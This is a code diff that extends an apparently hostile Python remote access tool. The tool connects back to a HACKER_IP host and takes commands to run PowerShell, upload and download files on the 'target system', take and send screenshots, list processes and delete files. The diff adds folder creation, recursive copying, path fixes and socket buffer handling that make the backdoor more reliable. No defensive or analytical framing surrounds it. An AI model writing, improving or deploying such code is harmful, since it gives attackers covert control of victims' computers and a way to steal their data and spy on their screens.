@@ -7,6 +7,9 @@ import time
 import struct
 from datetime import datetime
 
+# Global variable to maintain current working directory
+CURRENT_DIR = os.getcwd()
+
 def execute_powershell(cmd):
     try:
         result = subprocess.run(
@@ -30,8 +33,9 @@ def list_commands():
     download <file>  - Download a file from target system
     upload <file>    - Upload a file to target system
     create <file>    - Create an empty file
+    mkdir <folder>   - Create a new folder
     delete <file>    - Delete a file
-    copy <src> <dst> - Copy a file
+    copy <src> <dst> - Copy a file or folder (recursively)
     screenshot       - Take a screenshot and send it
     sysinfo          - Get system information
     processes        - List running processes
@@ -93,6 +97,14 @@ def execute_command(cmd, conn):
             open(filename, "w").close()
             return f"File {filename} created"
 
+        elif cmd.startswith("mkdir "):
+            foldername = cmd[6:]
+            try:
+                os.makedirs(foldername, exist_ok=True)
+                return f"Folder created: {foldername}"
+            except Exception as e:
+                return f"Error creating folder: {str(e)}"
+
         elif cmd.startswith("delete "):
             filename = cmd[7:]
             if os.path.exists(filename):
@@ -106,16 +118,21 @@ def execute_command(cmd, conn):
                 return "Usage: copy <src> <dst>"
             src, dst = parts[1], parts[2]
             if os.path.exists(src):
-                shutil.copy(src, dst)
-                return f"File copied to {dst}"
-            return "Source file not found"
+                if os.path.isdir(src):
+                    shutil.copytree(src, dst)  # Recursively copy folders
+                    return f"Folder copied to {dst}"
+                else:
+                    shutil.copy(src, dst)  # Copy single file
+                    return f"File copied to {dst}"
+            return "Source not found"
 
         elif cmd == "screenshot":
             filename = f"ss_{datetime.now().strftime('%Y%m%d_%H%M%S')}.png"
-            pyautogui.screenshot(filename)
-            with open(filename, "rb") as f:
+            abs_path = os.path.join(CURRENT_DIR, filename)
+            pyautogui.screenshot(abs_path)
+            with open(abs_path, "rb") as f:
                 data = f.read()
-            os.remove(filename)
+            os.remove(abs_path)
             return data
 
         elif cmd == "sysinfo":
@@ -139,6 +156,16 @@ def main():
             with socket.socket() as s:
                 s.connect((HACKER_IP, HACKER_PORT))
                 while True:
+                    # Clear any leftover data in the buffer first
+                    s.setblocking(0)  # Non-blocking mode to check for leftover data
+                    try:
+                        while s.recv(4096):  # Clear the buffer
+                            pass
+                    except BlockingIOError:
+                        pass  # No more data to read
+                    s.setblocking(1)  # Back to blocking mode
+
+                    # Now wait for and process the actual command
                     cmd = s.recv(4096).decode().strip()
                     if not cmd:
                         continue
@@ -152,7 +179,8 @@ def main():
                     else:
                         s.send(struct.pack("!I", len(response)) + response)
 
-        except Exception:
+        except Exception as e:
+            print(f"Connection error: {str(e)}")
             time.sleep(10)
             continue
 
